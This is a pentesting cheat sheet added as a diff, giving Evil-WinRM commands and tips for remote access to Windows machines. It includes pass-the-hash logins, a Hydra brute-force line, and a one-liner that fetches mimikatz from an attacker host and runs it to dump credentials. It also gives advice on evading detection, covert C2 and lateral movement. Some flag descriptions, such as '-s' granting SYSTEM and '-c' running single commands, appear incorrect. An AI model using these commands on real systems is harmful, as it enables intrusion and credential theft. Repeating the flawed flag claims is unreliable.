@@ -1,0 +1,215 @@
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> (or -p <password>)
+
+-----------------------------------------------------------
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> --ssl   (or -p <password>)
+-----------------------------------------------------------------------------------
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -s   or (-H <NTLM_HASH>)
+
+-----------------------------------------------------------------------------
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "ipconfig" or  (-H <NTLM_HASH>)
+
+---------------------------------------------------------------------------------------------
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "powershell.exe -ExecutionPolicy Bypass -File C:\\path\\to\\evil_script.ps1"
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+proxychains evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
+-------------------------------------------------------------------
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "Get-Process"
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "Get-LocalUser"
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "whoami /all"
+-----------------------------------------------------------------------
+
+hydra -l <USERNAME> -P <PASSWORD_LIST> <TARGET_IP> winrm
+
+-----------------------------------------------------------
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\Windows\\Temp\\mimikatz.exe; C:\\Windows\\Temp\\mimikatz.exe'"
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+Evil-WinRM is a powerful tool for penetration testing when you need to interact with remote Windows machines through the WinRM (Windows Remote Management) protocol. Below are tips, tricks, and best practices on how you can effectively use Evil-WinRM during pentesting engagements:
+
+Overview of Evil-WinRM
+
+Evil-WinRM provides a PowerShell-like shell for remote Windows systems via WinRM. It allows you to run PowerShell commands, scripts, and interact with the system interactively.
+
+Setup and Installation:
+
+Before we dive into the techniques, you need to set up Evil-WinRM on your attacking machine (Linux, macOS, or Windows):
+
+Step 1: Install Ruby
+
+Evil-WinRM is written in Ruby, so make sure Ruby is installed on your system. Here’s how to install it on various platforms:
+
+Ubuntu/Debian:
+
+sudo apt update
+sudo apt install ruby-full
+
+
+macOS (using Homebrew):
+
+brew install ruby
+
+
+Windows:
+Install Ruby from the official Ruby website
+.
+
+Step 2: Install Evil-WinRM
+
+Once Ruby is installed, you can install Evil-WinRM via RubyGems:
+
+gem install evil-winrm
+
+Connecting to a Target System
+
+After installation, you can start using Evil-WinRM to connect to a Windows machine. Here's how:
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
+
+Where:
+
+<TARGET_IP> is the IP address of the Windows target.
+
+<USERNAME> is the username (e.g., Administrator).
+
+<PASSWORD> is the password for the account.
+
+Optional: Using HTTPS (Encrypted Communication)
+
+You can also connect over HTTPS for encrypted communication if the target is configured to support it.
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> --ssl
+
+Key Tips & Tricks for Pentesting with Evil-WinRM
+1. Using Interactive PowerShell Shell
+
+Once connected, you will have an interactive PowerShell-like shell, which allows you to execute PowerShell commands remotely.
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
+
+This opens an interactive shell where you can execute Windows commands or PowerShell scripts.
+
+2. Escalating Privileges (Running as SYSTEM)
+
+You can use the -s option to run commands as the SYSTEM account, which is useful for privilege escalation on the remote system.
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -s
+
+
+This allows you to elevate your privileges to SYSTEM level, bypassing user-level restrictions.
+
+3. Executing Remote Commands Without Interactive Shell
+
+If you want to execute a single command without opening an interactive shell, you can use the -c option:
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "ipconfig"
+
+
+This will execute the ipconfig command remotely and show the output.
+
+4. Running PowerShell Scripts Remotely
+
+You can upload PowerShell scripts or run existing ones remotely. For example, if you have a script (e.g., evil_script.ps1) that you want to run on the target machine, use the -c option to execute it:
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "powershell.exe -ExecutionPolicy Bypass -File C:\\path\\to\\evil_script.ps1"
+
+
+This is useful for post-exploitation tasks where you want to run custom scripts to gather information or further exploit the system.
+
+5. Brute-Forcing WinRM Credentials (Hydra)
+
+If you have a list of potential usernames and passwords, you can use Hydra for brute-forcing WinRM credentials:
+
+hydra -l <USERNAME> -P <PASSWORD_LIST> <TARGET_IP> winrm
+
+
+Once you find valid credentials, use Evil-WinRM to interact with the system.
+
+6. Pivoting and Lateral Movement
+
+If the target is part of a larger network, Evil-WinRM can be useful for pivoting and lateral movement to other Windows machines that are reachable via WinRM.
+
+You can use Evil-WinRM to gain initial access to a compromised machine and then move to other systems on the same network.
+
+7. Evasion Techniques
+
+Evil-WinRM uses the WinRM protocol, which is legitimate and often permitted in enterprise environments. This can help evade detection by security monitoring tools.
+
+Encrypted Traffic: Use HTTPS (--ssl) for encrypted communication, which can bypass network monitoring tools that are looking for cleartext protocols like SMB or RDP.
+
+Legitimate Administrative Protocol: WinRM is a standard for remote management, and if WinRM traffic is already whitelisted in the environment, it can avoid detection.
+
+8. Command and Control (C2) via WinRM
+
+You can use Evil-WinRM for persistent command and control in situations where more traditional C2 frameworks (like Metasploit or Cobalt Strike) are too obvious. Because WinRM is a native protocol, it's often harder to distinguish from legitimate administrative traffic.
+
+9. Accessing Windows Event Logs
+
+Windows logs information in the Event Log. You can use PowerShell commands within Evil-WinRM to pull logs remotely:
+
+Get-WinEvent -LogName Security
+
+
+This can give you valuable insight into successful logins, failed attempts, and system activities, which are useful for both enumeration and privilege escalation.
+
+10. Using Mimikatz via Evil-WinRM
+
+Once you have elevated privileges or SYSTEM access, you can run Mimikatz (or a similar credential dump tool) to extract password hashes or cleartext credentials.
+
+For example:
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\Windows\\Temp\\mimikatz.exe; C:\\Windows\\Temp\\mimikatz.exe'"
+
+
+This will download Mimikatz and execute it remotely to dump credentials from memory.
+
+Additional Tips for Effective Use in Pentesting
+
+Use ProxyChains for Anonymity:
+If you’re testing from a Linux machine and want to anonymize your connection, use ProxyChains to route Evil-WinRM through a proxy:
+
+proxychains evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
+
+Batch Command Execution:
+Instead of running individual commands, you can use PowerShell to run a series of commands or batch scripts on the target machine. This allows you to chain multiple actions in one go, saving time and reducing the chance of detection.
+
+Enumerating Target Systems:
+You can use Evil-WinRM to run commands to enumerate the remote system, like checking for installed applications, user accounts, or open ports:
+
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "Get-Process"
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -c "Get-LocalUser"
+
+
+Pivots and Lateral Movement:
+After gaining access to one machine, Evil-WinRM can be used to move laterally to other machines, provided WinRM is open on those systems. You can automate this with scripts or use credential dumping to escalate privileges across systems.
+
+Conclusion
+
+Evil-WinRM is an incredibly useful tool for pentesters because it leverages WinRM, a legitimate Windows protocol. By using Evil-WinRM in your penetration tests, you can:
+
+Perform post-exploitation activities.
+
+Gain remote access to Windows systems with minimal detection risk.
+
+Use elevation of privilege and lateral movement techniques via WinRM.
+
+It’s best used when stealth is important or when you need to interact with Windows systems in environments where traditional penetration testing tools like SMB or RDP might be more easily detected.
